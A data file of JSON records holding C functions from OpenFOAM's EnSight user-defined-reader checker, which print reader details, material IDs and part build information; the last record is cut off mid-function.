{"docstring": "/*------------\n * prelim_info\n *------------*/\n", "func_signal": "static int\nprelim_info(int *two_fields, int *any_extra_gui)", "code": "{\n  int err;\n  char reader_name[Z_MAX_USERD_NAME];\n  char release_number[Z_MAX_USERD_NAME];\n  char description[Z_MAXFILENP];\n  int i,j;\n\n  *any_extra_gui = FALSE;\n\n  /* Get the reader name\n   *--------------------*/\n  err = USERD_get_name_of_reader(reader_name,two_fields);\n  if(err == Z_OK) {\n    fprintf(stderr,\" Name of reader: %s\\n\",reader_name);\n    if(*two_fields==1) {\n      fprintf(stderr,\" two_fields:     TRUE\\n\");\n    }\n    else if(*two_fields==0){\n      fprintf(stderr,\" two_fields:     FALSE\\n\");\n    }\n    else if(*two_fields < 0) {\n      fprintf(stderr,\" two_fields:     -1 (optional string) \\n\");\n    }\n  }\n  else {\n    fprintf(stderr,\"Error: Could not get name of reader\\n\");\n    return(Z_ERR);\n  }\n\n  /* Get the Extra GUI stuff (optional)\n   * ---------------------------------------------------------- */\n#ifdef _EGS\n\n  /* Get the Extra GUI numbers of toggles, pulldowns, & fields\n   * ---------------------------------------------------------- */\n\n USERD_get_extra_gui_numbers(      &Num_toggles,\n                                  &Num_pulldowns,\n                                  &Num_fields );\n\n if ( Num_toggles > 0 || Num_pulldowns > 0 || Num_fields > 0 ) {\n\n\n   *any_extra_gui = TRUE;\n\n   if (Num_toggles>0) {\n     Toggle_title = (char **) calloc(Num_toggles,sizeof(char*));\n     if (Toggle_title == (char **)NULL) return(Z_ERR);\n     for (i=0; i<Num_toggles; i++) {\n       Toggle_title[i] = (char *) calloc(Z_LEN_GUI_TITLE_STR,sizeof(char));\n       if ( Toggle_title[i] == (char *)NULL ) return(Z_ERR);\n     }\n     Toggle_default_status = (int *) calloc(Num_toggles,sizeof(int));\n     Toggle_choice = (int *) calloc(Num_toggles,sizeof(int));\n   }\n\n   if (Num_pulldowns > 0) {\n     Pulldown_title = (char **) calloc( Num_pulldowns , sizeof(char*) );\n     if (Pulldown_title == (char **)NULL) return(Z_ERR);\n\n     Pulldown_item_strings = (char ***) calloc( Num_pulldowns , sizeof(char**) );\n     if (Pulldown_item_strings == (char ***)NULL) return(Z_ERR);\n\n     for (i=0; i<Num_pulldowns; i++) {\n       Pulldown_title[i] = (char *) calloc( Z_LEN_GUI_TITLE_STR , sizeof(char) );\n       if ( Pulldown_title[i] == (char *)NULL ) return(Z_ERR);\n\n       Pulldown_item_strings[i] = (char **) calloc( Z_MAX_NUM_GUI_PULL_ITEMS , sizeof(char *) );\n       if (Pulldown_item_strings[i] == (char **)NULL) return(Z_ERR);\n\n       for(j = 0; j < Z_MAX_NUM_GUI_PULL_ITEMS; j++) {\n         Pulldown_item_strings[i][j] = (char *) calloc( Z_LEN_GUI_PULL_STR , sizeof(char) );\n         if ( Pulldown_item_strings[i][j] == (char *)NULL ) return(Z_ERR);\n       }\n     }\n     Pulldown_number_in_list = (int *) calloc(Num_pulldowns,sizeof(int));\n     Pulldown_default_selection = (int *) calloc(Num_pulldowns,sizeof(int));\n     Pulldown_choice = (int *) calloc(Num_pulldowns,sizeof(int));\n   }\n\n   if (Num_fields > 0) {\n     Field_title = (char **) calloc(Num_fields,sizeof(char*));\n     Field_user_string = (char **) calloc(Num_fields,sizeof(char*));\n     if (Field_title == (char **) NULL) return(Z_ERR);\n     for (i=0; i<Num_fields; i++) {\n       Field_title[i] = (char *) calloc(Z_LEN_GUI_TITLE_STR,sizeof(char));\n       if ( Field_title[i] == (char *)NULL) return(Z_ERR);\n       Field_user_string[i] = (char *) calloc(Z_LEN_GUI_FIELD_STR,sizeof(char));\n       if ( Field_user_string[i] == (char *)NULL) return(Z_ERR);\n     }\n   }\n\n\n   err = USERD_get_extra_gui_defaults(\n                                    Toggle_title,                 /* [num_toggles][Z_LEN_GUI_TITLE_STR] */\n                                    Toggle_default_status,        /* [num_toggles] */\n                                    Pulldown_title,               /* [num_pulldowns][Z_LEN_GUI_TITLE_STR] */\n                                    Pulldown_number_in_list,      /* [num_pulldowns] */\n                                    Pulldown_default_selection,   /* [num_pulldowns] */\n                                    Pulldown_item_strings,        /* [num_pulldowns][Z_MAX_NUM_GUI_PULL_ITEMS][Z_LEN_GUI_PULL_STR] */\n                                    Field_title,                  /* [num_fields][Z_LEN_GUI_TITLE_STR] */\n                                    Field_user_string              /* [num_fields][Z_LEN_GUI_FIELD_STR] */\n                                    );\n   if (Z_ERR == err) return(Z_ERR);\n\n   fprintf(stderr,\"\\n**********************************************\\n\");\n   fprintf(stderr,\"****          Extra GUI Information        ***\\n\");\n   fprintf(stderr,\"**********************************************\\n\\n\");\n\n   fprintf(stderr,\"\\nTOGGLE INFO: %d active toggles\\n\",Num_toggles);\n   for (i=0; i<Num_toggles; i++) {\n     fprintf(stderr,\"Toggle Title %d : %s\\n\",i,Toggle_title[i]);\n     fprintf(stderr,\"Default status = %d \\n\",Toggle_default_status[i]);\n   }\n\n   fprintf(stderr,\"\\nPULLDOWN INFO: %d active pulldowns\\n\",Num_pulldowns);\n   for (i=0; i<Num_pulldowns; i++) {\n     fprintf(stderr,\"Pulldown Title %d : %s\\n\", i , Pulldown_title[i] );\n     for (j=0; j<Z_MAX_NUM_GUI_PULL_ITEMS; j++) {\n       fprintf(stderr,\"Pulldown_item %d : %s\\n\",j,Pulldown_item_strings[i][j]);\n       if (strlen(Pulldown_item_strings[i][j]) == 0) {\n         Pulldown_number_in_list[i] = j;\n         break;\n       }\n     }\n     fprintf(stderr,\"Number of items in list: %d\\n\",Pulldown_number_in_list[i]);\n     fprintf(stderr,\"Default selection: %d\\n\\n\",Pulldown_default_selection[i]);\n   }\n   fprintf(stderr,\"\\n\");\n\n   fprintf(stderr,\"\\nFIELDINFO: %d active fields\\n\",Num_fields);\n   for (i=0; i<Num_fields; i++) {\n     fprintf(stderr,\"Field Title %d : %s\\n\",i,Field_title[i]);\n     fprintf(stderr,\"Field string %d: %s\\n\",i,Field_user_string[i]);\n   }\n   fprintf(stderr,\"\\n\\n\\n\");\n }\n\n#endif\n\n\n#if (defined GT_USERD_API_100)\n\n  /* Get the reader api used\n   *------------------------*/\n  err = USERD_get_reader_version(Version_number);\n  if(err == Z_OK) {\n    fprintf(stderr,\" API version:    %s\\n\",Version_number);\n  }\n  else {\n    fprintf(stderr,\"Error: Could not get reader api version\\n\");\n    return(Z_ERR);\n  }\n\n  /* Get the reader release\n   *-----------------------*/\n  err = USERD_get_reader_release(release_number);\n  if(err == Z_OK) {\n    fprintf(stderr,\" Release:        %s\\n\",release_number);\n  }\n  else {\n    fprintf(stderr,\"Error: Could not get reader release\\n\");\n    return(Z_ERR);\n  }\n#else\n  fprintf(stderr,\" API version:    1.00\\n\");\n#endif\n\n\n#if 0\n  /* Get the reader description\n   *---------------------------*/\n  err = USERD_get_reader_descrip(description);\n  if(err == Z_OK) {\n    fprintf(stderr,\" Description:\\n\\n\");\n    fprintf(stderr,\"%s\\n\\n\",description);\n  }\n  else {\n    fprintf(stderr,\"Error: Could not get reader description\\n\");\n    return(Z_ERR);\n  }\n#else\n  fprintf(stderr,\"  Note: Not currently calling USERD_get_reader_descrip\\n\");\n  fprintf(stderr,\"        because it is optional.\\n\");\n#endif\n\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*--------------\n * Usage routine\n *--------------*/\n", "func_signal": "static void\nusage( void )", "code": "{\n  fprintf(stderr,\"------------------------------------------------------------\\n\");\n  fprintf(stderr,\"USAGE: checker [-p pfile] [-server_number] [-gts #] [-vts #]\\n\");\n  fprintf(stderr,\"------------------------------------------------------------\\n\");\n  fprintf(stderr,\"  -h, -help       Prints out this USAGE text.\\n\");\n  fprintf(stderr,\"  -gts #          Specify the geometry times step to use.)\\n\");\n  fprintf(stderr,\"  -p pfile        Plays the checker playfile (pfile).\\n\");\n  fprintf(stderr,\"  -server_number  Cause servers numbers to be prompted for.\\n\");\n  fprintf(stderr,\"  -vts #          Specify the variable times step to use.)\\n\");\n  fprintf(stderr,\"\\n\");\n  exit(1);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*----------------------\n * gold_materials_loader\n *----------------------*/\n", "func_signal": "static int\ngold_materials_loader(int geom_time_step)", "code": "{\n  int i, j, k, ms, nn;\n  int err, err1, err2;\n  int geom_timeset;\n  int p, pn;\n  int et, e1, e2;\n  int num_dims;\n  int comp;\n  int bdim[3];\n  int ne;\n  int cell_type;\n  int bd1,bd2,bd3;\n  int *ivals;\n  float *fvals;\n  int do_num;\n  int mixed_present;\n  int matf_size, matfv_size;\n\n\n  fprintf(stderr,\"\\n-------------- materials_loader --------------\\n\");\n\n  if(Num_time_sets > 0) {\n    /* Get the timeset used for the geometry\n     *--------------------------------------*/\n    geom_timeset = USERD_get_geom_timeset_number();\n\n    /* Get the number of time steps for this timeset\n     *----------------------------------------------*/\n    Num_time_steps = USERD_get_num_of_time_steps(geom_timeset);\n    if(Num_time_steps < 1) {\n      fprintf(stderr,\" Error: Num time steps returned: %d\\n\",Num_time_steps);\n      fprintf(stderr,\" (Must be >0 to be okay)\\n\");\n      return(Z_ERR);\n    }\n    if(geom_time_step > (Num_time_steps - 1)) {\n      geom_time_step = Num_time_steps - 1;\n    }\n\n    /* Set the timeset and step - to first step by default, but\n     * can set it at others using -gts command argument\n     *---------------------------------------------------------*/\n    USERD_set_time_set_and_step(geom_timeset,geom_time_step);\n\n    fprintf(stderr,\" Using timeset:   %d  (step range is %d through %d)\\n\",\n            geom_timeset,0,Num_time_steps-1);\n    fprintf(stderr,\" Using time step: %d\\n\",geom_time_step);\n  }\n\n  for(ms=0; ms<Num_materials_sets; ++ms) {\n    fprintf(stderr,\"\\n\");\n    fprintf(stderr,\" Materials Set %d:\\n\",ms+1);\n\n    for(p=0; p<Num_parts; ++p) {\n      pn = p+1;\n\n      fprintf(stderr,\"\\n\");\n      fprintf(stderr,\"   Part %d:\\n\",pn);\n\n      /*-----------------------\n       * For unstructured parts\n       *-----------------------*/\n      if(Pbuild[p].type == Z_UNSTRUCTURED) {\n\n        e1 = 0;\n        e2 = Z_MAXTYPE;\n      }\n      else {\n        for(comp=0; comp<3; ++comp) {\n          if(Pbuild[p].ne[comp] < 1) {\n            bdim[comp] = 1;\n          }\n          else {\n            bdim[comp] = Pbuild[p].ne[comp];\n          }\n        }\n        nn = bdim[0] * bdim[1] * bdim[2];\n\n        bd1 = bdim[0]-1;\n        if(bd1 < 1) {\n          bd1 = 1;\n        }\n        bd2 = bdim[1]-1;\n        if(bd2 < 1) {\n          bd2 = 1;\n        }\n        bd3 = bdim[2]-1;\n        if(bd3 < 1) {\n          bd3 = 1;\n        }\n        ne = bd1 * bd2 * bd3;\n\n        /* Determine cell type\n         *--------------------*/\n        num_dims = 3;\n        for(i=0; i<3; ++i) {\n          if(bdim[i] == 1) {\n            --num_dims;\n          }\n        }\n        if(num_dims == 3) {\n          cell_type = Z_HEX08;\n        }\n        else if(num_dims == 2) {\n          cell_type = Z_QUA04;\n        }\n        else {\n          cell_type = Z_BAR02;\n        }\n\n        e1 = cell_type;\n        e2 = cell_type + 1;\n      }\n\n\n      for(et=e1; et<e2; ++et) {\n\n        if(Pbuild[p].type == Z_UNSTRUCTURED) {\n          ne = Pbuild[p].ne[et];\n        }\n\n        if(ne > 0) {\n\n          /* Get the material ids, if any\n           *-----------------------------*/\n          err = USERD_size_matf_data(ms,\n                                     pn,\n                                     et,\n                                     Z_MAT_INDEX,\n                                     &matf_size);\n          if(err == Z_OK && matf_size > 0) {\n\n\n            /* Go get the material ids\n             *------------------------*/\n            ivals = (int *) calloc(matf_size,sizeof(int));\n            if(ivals == (int *)NULL) {\n              fprintf(stderr,\" Problems allocating for material ids\\n\");\n              return(Z_ERR);\n            }\n            err = USERD_load_matf_data(ms,\n                                       pn,\n                                       et,\n                                       Z_MAT_INDEX,\n                                       ivals,\n                                       fvals);\n            if(err == Z_OK) {\n              if(matf_size < 20) {\n                fprintf(stderr,\"     Printing all mat ids for %s elements\\n\",\n                        Elem_info[et].name);\n                do_num = matf_size;\n              }\n              else {\n                fprintf(stderr,\"     Printing first 20 mat ids for %s elements\\n\",\n                        Elem_info[et].name);\n                do_num = 20;\n              }\n\n              /* See if any mixed materials\n               *---------------------------*/\n              mixed_present = FALSE;\n              for(k=0; k<matf_size; ++k) {\n                if(ivals[k] < 0) {\n                  mixed_present = TRUE;\n                  break;\n                }\n              }\n\n              /* Feedback\n               *---------*/\n              for(k=0; k<do_num; ++k) {\n                fprintf(stderr,\"       mat id[%d] = %d\\n\",k,ivals[k]);\n              }\n              free(ivals);\n            }\n            else {\n              fprintf(stderr,\"     Trouble getting mat ids for %s elements\\n\",\n                      Elem_info[et].name);\n              free(ivals);\n              return(Z_ERR);\n            }\n          }\n          else {\n            fprintf(stderr,\"     %s elements have no material ids\\n\",\n                    Elem_info[et].name);\n          }\n\n\n          /* Get the mixed material ids, if any\n           *-----------------------------------*/\n          if(mixed_present) {\n            err1 = USERD_size_matf_data(ms,\n                                        pn,\n                                        et,\n                                        Z_MIX_INDEX,\n                                        &matf_size);\n            err2 = USERD_size_matf_data(ms,\n                                        pn,\n                                        et,\n                                        Z_MIX_VALUE,\n                                        &matfv_size);\n\n            if(err1 == Z_OK &&\n               err2 == Z_OK &&\n               matf_size > 0 &&\n               matfv_size > 0) {\n\n              /* Go get the material ids\n               *------------------------*/\n              ivals = (int *) calloc(matf_size,sizeof(int));\n              if(ivals == (int *)NULL) {\n                fprintf(stderr,\" Problems allocating for mixed material ids\\n\");\n                return(Z_ERR);\n              }\n              fvals = (float *) calloc(matfv_size,sizeof(float));\n              if(fvals == (float *)NULL) {\n                fprintf(stderr,\" Problems allocating for mixed material values\\n\");\n                return(Z_ERR);\n              }\n\n              err1 = USERD_load_matf_data(ms,\n                                          pn,\n                                          et,\n                                          Z_MIX_INDEX,\n                                          ivals,\n                                          fvals);\n\n              err2 = USERD_load_matf_data(ms,\n                                          pn,\n                                          et,\n                                          Z_MIX_VALUE,\n                                          ivals,\n                                          fvals);\n              if(err1 == Z_OK &&\n                 err2 == Z_OK) {\n                if(matf_size < 20) {\n                  fprintf(stderr,\"     Printing all mixed mat ids for %s elements\\n\",\n                          Elem_info[et].name);\n                  do_num = matf_size;\n                }\n                else {\n                  fprintf(stderr,\"     Printing first 20 mixed mat ids for %s elements\\n\",\n                          Elem_info[et].name);\n                  do_num = 20;\n                }\n                for(k=0; k<do_num; ++k) {\n                  fprintf(stderr,\"       mixed mat id[%d] = %d\\n\",k,ivals[k]);\n                }\n                free(ivals);\n\n                if(matfv_size < 20) {\n                  fprintf(stderr,\"     Printing all mixed mat values for %s elements\\n\",\n                          Elem_info[et].name);\n                  do_num = matfv_size;\n                }\n                else {\n                  fprintf(stderr,\"     Printing first 20 mixed mat values for %s elements\\n\",\n                          Elem_info[et].name);\n                  do_num = 20;\n                }\n                for(k=0; k<do_num; ++k) {\n                  fprintf(stderr,\"       mixed mat val[%d] = %f\\n\",k,fvals[k]);\n                }\n                free(fvals);\n              }\n              else {\n                fprintf(stderr,\"     Trouble getting mixed mat ids or vals for %s elements\\n\",\n                        Elem_info[et].name);\n                free(ivals);\n                free(fvals);\n                return(Z_ERR);\n              }\n            }\n            else {\n              fprintf(stderr,\"     Trouble getting mixed mat sizes for %s elements\\n\",\n                      Elem_info[et].name);\n              return(Z_ERR);\n            }\n          }\n          else {\n            fprintf(stderr,\"       (%s elements have no mixed material ids)\\n\",\n                    Elem_info[et].name);\n          }\n        }\n      }\n    }\n  }\n  return(Z_OK);\n}", "path": "applications\\test\\ensightFoamReader\\udr_checker-80.c", "repo_name": "OpenFOAM/OpenFOAM-2.2.x", "stars": 82, "license": "other", "language": "c", "size": 47005}
{"docstring": "/*----------------\n * part_build_info\n *----------------*/\n", "func_signal": "static int\npart_build_info(int geom_time_step)", "code": "{\n  int i, j;\n  int fn;\n  int err;\n  int num_dataset_files;\n  int geom_time_set;\n  Z_QFILES *qfiles;\n  char line1[Z_BUFL];\n  char line2[Z_BUFL];\n\n  int *part_ids;\n  int *part_types;\n  int *number_of_nodes;\n  int **num_elems;\n  int **ijk_dimensions;\n  int **iblanking_options;\n  char **part_descriptions;\n\n  int ghosts_in_block;\n\n  int *max_num_nodes;\n  int **max_num_elems;\n  int **max_ijk_dimensions;\n  float extents[6];\n\n\n  fprintf(stderr,\"\\n------------ part_build_info ------------\\n\");\n\n#if (defined GT_USERD_API_100)\n\n  /* Get the timeset used for the geometry\n   *--------------------------------------*/\n  geom_time_set = USERD_get_geom_timeset_number();\n\n  /* Set the timeset and step - to first step\n   *-----------------------------------------*/\n\n  USERD_set_time_set_and_step(geom_time_set,geom_time_step);\n\n#else\n\n  /* Set the time step - to first step\n   *----------------------------------*/\n  USERD_set_time_step(geom_time_step);\n\n#endif\n\n  /* Get the changing geometry status\n   *---------------------------------*/\n  Geom_status = USERD_get_changing_geometry_status();\n  if(Geom_status == Z_STATIC) {\n    fprintf(stderr,\" Geom changing status: Z_STATIC\\n\");\n  }\n  else if(Geom_status == Z_CHANGE_COORDS) {\n    fprintf(stderr,\" Geom changing status: Z_CHANGE_COORDS\\n\");\n  }\n  else if(Geom_status == Z_CHANGE_CONN) {\n    fprintf(stderr,\" Geom changing status: Z_CHANGE_CONN\\n\");\n  }\n  else {\n    fprintf(stderr,\" Invalid Geom changing status!!\\n\");\n  }\n\n\n  /* Get the node label status\n   *--------------------------*/\n  Node_labels = USERD_get_node_label_status();\n  if(Node_labels) {\n    fprintf(stderr,\" Node labels will be provided\\n\");\n  }\n  else {\n    fprintf(stderr,\" Node labels will NOT be provided\\n\");\n  }\n\n  /* Get the element label status\n   *-----------------------------*/\n  Element_labels = USERD_get_element_label_status();\n  if(Element_labels) {\n    fprintf(stderr,\" Element labels will be provided\\n\");\n  }\n  else {\n    fprintf(stderr,\" Element labels will NOT be provided\\n\");\n  }\n\n  fprintf(stderr,\"\\n\");\n\n  /* Get the number of files in the dataset\n   *---------------------------------------*/\n  num_dataset_files = USERD_get_number_of_files_in_dataset();\n  fprintf(stderr,\" Number of files in dataset: %d\\n\",num_dataset_files);\n\n\n  /* Get the dataset query file info\n   *--------------------------------*/\n  if(num_dataset_files > 0) {\n\n    qfiles = (Z_QFILES *) calloc(num_dataset_files,sizeof(Z_QFILES));\n    if(qfiles == (Z_QFILES *)NULL) {\n      fprintf(stderr,\"Error: allocating for dataset query files\\n\");\n      return(Z_ERR);\n    }\n    else {\n\n      for(i=0; i<num_dataset_files; ++i) {\n        qfiles[i].f_desc = (char **) calloc(10,sizeof(char *));\n        if(qfiles[i].f_desc == (char **)NULL) {\n          fprintf(stderr,\"Error: allocating for dataset query descrip lines\\n\");\n          return(Z_ERR);\n        }\n        else {\n          for(j=0; j<10; ++j) {\n            qfiles[i].f_desc[j] = (char *) calloc(Z_MAXFILENP,sizeof(char));\n            if(qfiles[i].f_desc[j] == (char *)NULL) {\n              fprintf(stderr,\"Error: allocating for dataset query descrip lines\\n\");\n              return(Z_ERR);\n            }\n          }\n        }\n      }\n\n      err = USERD_get_dataset_query_file_info(qfiles);\n      if(err == Z_OK) {\n        for(fn=0; fn<num_dataset_files; ++fn) {\n          fprintf(stderr,\" For dataset file %d:\\n\",fn);\n\n          fprintf(stderr,\"   name:           %s\\n\",qfiles[fn].name);\n          fprintf(stderr,\"   size:           %d\\n\",qfiles[fn].sizeb);\n          fprintf(stderr,\"   time:           %s\\n\",qfiles[fn].timemod);\n          fprintf(stderr,\"   num desc lines: %d\\n\",qfiles[fn].num_d_lines);\n          for(i=0; i<qfiles[fn].num_d_lines; ++i) {\n            fprintf(stderr,\"    desc line %d: %s\\n\",i,qfiles[fn].f_desc[i]);\n          }\n        }\n      }\n      else {\n        fprintf(stderr,\"Error: getting dataset query info\\n\");\n        return(Z_ERR);\n      }\n    }\n\n    /* Free allocated memory\n     *----------------------*/\n    for(i=0; i<num_dataset_files; ++i) {\n      for(j=0; j<10; ++j) {\n        free(qfiles[i].f_desc[j]);\n      }\n      free(qfiles[i].f_desc);\n    }\n    free(qfiles);\n  }\n\n  fprintf(stderr,\"\\n-----------------------------------------\\n\");\n\n#if (defined GT_USERD_API_100)\n\n  /* Get the geometry description lines\n   *-----------------------------------*/\n  err = USERD_get_descrip_lines(Z_GEOM,0,FALSE,line1,line2);\n  if(err == Z_OK) {\n    fprintf(stderr,\" Geom Desc line1: %s\\n\",line1);\n    fprintf(stderr,\" Geom Desc line2: %s\\n\",line2);\n  }\n  else {\n    fprintf(stderr,\"Error: getting geom description lines\\n\");\n    return(Z_ERR);\n  }\n\n#else\n\n  /* Get the geometry description lines\n   *-----------------------------------*/\n  err = USERD_get_description_lines(Z_GEOM,0,line1,line2);\n  if(err == Z_OK) {\n    fprintf(stderr,\" Geom Desc line1: %s\\n\",line1);\n    fprintf(stderr,\" Geom Desc line2: %s\\n\",line2);\n  }\n  else {\n    fprintf(stderr,\"Error: getting geom description lines\\n\");\n    return(Z_ERR);\n  }\n\n#endif\n\n  /* Get the number of model parts\n   *------------------------------*/\n  Num_parts = USERD_get_number_of_model_parts();\n  if(Num_parts > 0) {\n    fprintf(stderr,\" Number of parts: %d\\n\",Num_parts);\n  }\n  else {\n    fprintf(stderr,\" Problems getting number of parts\\n\");\n    return(Z_ERR);\n  }\n\n\n\n  /* Get the gold part build info\n   *-----------------------------*/\n  Pbuild = (BUILDINFO *) calloc(Num_parts,sizeof(BUILDINFO));\n  if(Pbuild == (BUILDINFO *)NULL) {\n    fprintf(stderr,\" Problems allocating for Pbuild structure\\n\");\n    return(Z_ERR);\n  }\n\n\n  part_ids = (int *) calloc(Num_parts,sizeof(int));\n  if(part_ids == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for part ids\\n\");\n    return(Z_ERR);\n  }\n\n  part_types = (int *) calloc(Num_parts,sizeof(int));\n  if(part_types == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for part types\\n\");\n    return(Z_ERR);\n  }\n\n  part_descriptions = (char **) calloc(Num_parts,sizeof(char *));\n  if(part_descriptions == (char **)NULL) {\n    fprintf(stderr,\" Problems allocating for part descriptions\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_parts; ++i) {\n      part_descriptions[i] = (char *) calloc(Z_BUFL,sizeof(char));\n      if(part_descriptions[i] == (char *)NULL) {\n        fprintf(stderr,\" Problems allocating for part descriptions\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n  number_of_nodes = (int *) calloc(Num_parts,sizeof(int));\n  if(number_of_nodes == (int *)NULL) {\n    fprintf(stderr,\" Problems allocating for part number of nodes\\n\");\n    return(Z_ERR);\n  }\n\n  num_elems = (int **) calloc(Num_parts,sizeof(int *));\n  if(num_elems == (int **)NULL) {\n    fprintf(stderr,\" Problems allocating for part number of elements\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_parts; ++i) {\n      num_elems[i] = (int *) calloc(Z_MAXTYPE,sizeof(int));\n      if(num_elems[i] == (int *)NULL) {\n        fprintf(stderr,\" Problems allocating for part number of elements\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n  ijk_dimensions = (int **) calloc(Num_parts,sizeof(int *));\n  if(ijk_dimensions == (int **)NULL) {\n    fprintf(stderr,\" Problems allocating for part ijk dimensions\\n\");\n    return(Z_ERR);\n  }\n  else {\n\n#if (defined GT_USERD_API_202)\n    for(i=0; i<Num_parts; ++i) {\n      ijk_dimensions[i] = (int *) calloc(9,sizeof(int));\n      if(ijk_dimensions[i] == (int *)NULL) {\n        fprintf(stderr,\" Problems allocating for part ijk dimensions\\n\");\n        return(Z_ERR);\n      }\n      else {\n        for(j=0; j<9; ++j) {\n          ijk_dimensions[i][j] = -1;\n        }\n      }\n    }\n#else\n    for(i=0; i<Num_parts; ++i) {\n      ijk_dimensions[i] = (int *) calloc(3,sizeof(int));\n      if(ijk_dimensions[i] == (int *)NULL) {\n        fprintf(stderr,\" Problems allocating for part ijk dimensions\\n\");\n        return(Z_ERR);\n      }\n    }\n#endif\n  }\n\n  iblanking_options = (int **) calloc(Num_parts,sizeof(int *));\n  if(iblanking_options == (int **)NULL) {\n    fprintf(stderr,\" Problems allocating for part iblanking options\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_parts; ++i) {\n      iblanking_options[i] = (int *) calloc(6,sizeof(int));\n      if(iblanking_options[i] == (int *)NULL) {\n        fprintf(stderr,\" Problems allocating for part iblanking options\\n\");\n        return(Z_ERR);\n      }\n    }\n  }\n\n\n#if (defined GT_USERD_API_100)\n\n  err = USERD_get_gold_part_build_info(part_ids,\n                                       part_types,\n                                       part_descriptions,\n                                       number_of_nodes,\n                                       num_elems,\n                                       ijk_dimensions,\n                                       iblanking_options);\n#else\n\n  err = USERD_get_part_build_info(part_ids,\n                                  part_types,\n                                  part_descriptions,\n                                  num_elems,\n                                  ijk_dimensions,\n                                  iblanking_options);\n\n#endif\n\n  if(err == Z_ERR) {\n    fprintf(stderr,\" Problems getting part build info\\n\");\n    return(Z_ERR);\n  }\n  else {\n    for(i=0; i<Num_parts; ++i) {\n      fprintf(stderr,\" For part %d:\\n\",i+1);\n\n      fprintf(stderr,\"   part id:   %d\\n\",part_ids[i]);\n      Pbuild[i].id = part_ids[i];\n\n      if(part_types[i] == Z_UNSTRUCTURED) {\n        fprintf(stderr,\"   part type: Z_UNSTRUCTURED\\n\");\n      }\n      else if(part_types[i] == Z_STRUCTURED) {\n        fprintf(stderr,\"   part type: Z_STRUCTURED\\n\");\n      }\n      else if(part_types[i] == Z_IBLANKED) {\n        fprintf(stderr,\"   part type: Z_IBLANKED\\n\");\n      }\n      else {\n        fprintf(stderr,\"   Invalid part type\\n\");\n        return(Z_ERR);\n      }\n      Pbuild[i].type = part_types[i];\n\n      fprintf(stderr,\"   part desc:   %s\\n\",part_descriptions[i]);\n      strncpy(Pbuild[i].desc,part_descriptions[i],Z_BUFL);\n\n#if (defined GT_USERD_API_100)\n      fprintf(stderr,\"   number of nodes :   %d\\n\",number_of_nodes[i]);\n      Pbuild[i].nn = number_of_nodes[i];\n#else\n      Pbuild[i].nn = USERD_get_number_of_global_nodes();\n#endif\n\n      for(j=0; j<Z_MAXTYPE; ++j) {\n        if(num_elems[i][j] > 0) {\n          fprintf(stderr,\"   # %s elements:   %d\\n\",\n                  Elem_info[j].name,num_elems[i][j]);\n          Pbuild[i].ne[j] = num_elems[i][j];\n        }\n      }\n\n      if(part_types[i] != Z_UNSTRUCTURED) {\n\n        /* For this checker, we will place the following in the\n         * Pbuild[].ne[] structure:\n         *\n         *   Note this is can be used for block size whether ranges or not\n         *   -------------------------------------------------------------\n         *   Pbuild[].ne[0] = i dim of current block (to the range selected)\n         *   Pbuild[].ne[1] = j dim of current block (to the range selected)\n         *   Pbuild[].ne[2] = k dim of current block (to the range selected)\n         *\n         *   Thus if ranges:\n         *   ---------------\n         *   Pbuild[].ne[3] = i min range          (-1 indicates no ranges)\n         *   Pbuild[].ne[4] = i max range\n         *   Pbuild[].ne[5] = i min range\n         *   Pbuild[].ne[6] = i max range\n         *   Pbuild[].ne[7] = i min range\n         *   Pbuild[].ne[8] = i max range\n         *\n         *   Pbuild[].ne[9]  = i dim of total block (if ranges)\n         *   Pbuild[].ne[10] = j dim of total block (if ranges)\n         *   Pbuild[].ne[11] = k dim of total block (if ranges)\n         *\n         *   What comes back from the api is:\n         *   --------------------------------\n         *   before 2.03 (no ranges)\n         *   -----------------------\n         *   ijk_dimensions[][0] = i dim of block\n         *   ijk_dimensions[][1] = j dim of block\n         *   ijk_dimensions[][2] = k dim of block\n         *\n         *   at 2.03 (if no ranges)\n         *   -------\n         *   ijk_dimensions[][0] = i dim of block\n         *   ijk_dimensions[][1] = j dim of block\n         *   ijk_dimensions[][2] = k dim of block\n         *   ijk_dimensions[][3] = -1\n         *\n         *   at 2.03 (if ranges)\n         *   -------\n         *   ijk_dimensions[][0] = i dim of total block\n         *   ijk_dimensions[][1] = j dim of total block\n         *   ijk_dimensions[][2] = k dim of total block\n         *   ijk_dimensions[][3] = i min range\n         *   ijk_dimensions[][4] = i max range\n         *   ijk_dimensions[][5] = j min range\n         *   ijk_dimensions[][6] = j max range\n         *   ijk_dimensions[][7] = k min range\n         *   ijk_dimensions[][8] = k max range\n         *--------------------------------------------------------------*/\n\n#if (defined GT_USERD_API_202)\n        if(ijk_dimensions[i][3] == -1) {\n          fprintf(stderr,\"   ijk_dimensions: %d %d %d\\n\",\n                  ijk_dimensions[i][0],\n                  ijk_dimensions[i][1],\n                  ijk_dimensions[i][2]);\n          Pbuild[i].ne[0] = ijk_dimensions[i][0];\n          Pbuild[i].ne[1] = ijk_dimensions[i][1];\n          Pbuild[i].ne[2] = ijk_dimensions[i][2];\n          Pbuild[i].ne[3] = ijk_dimensions[i][3];\n        }\n        else {\n\n          /* If empty part\n           *--------------*/\n          if(ijk_dimensions[i][0] == 0 &&\n             ijk_dimensions[i][1] == 0 &&\n             ijk_dimensions[i][2] == 0) {\n            fprintf(stderr,\"   ijk_dimensions: %d %d %d\\n\",\n                    ijk_dimensions[i][0],\n                    ijk_dimensions[i][1],\n                    ijk_dimensions[i][2]);\n            Pbuild[i].ne[0] = ijk_dimensions[i][0];\n            Pbuild[i].ne[1] = ijk_dimensions[i][1];\n            Pbuild[i].ne[2] = ijk_dimensions[i][2];\n            Pbuild[i].ne[3] = -1;\n          }\n\n          /* range part\n           *-----------*/\n          else {\n            Pbuild[i].ne[0] = 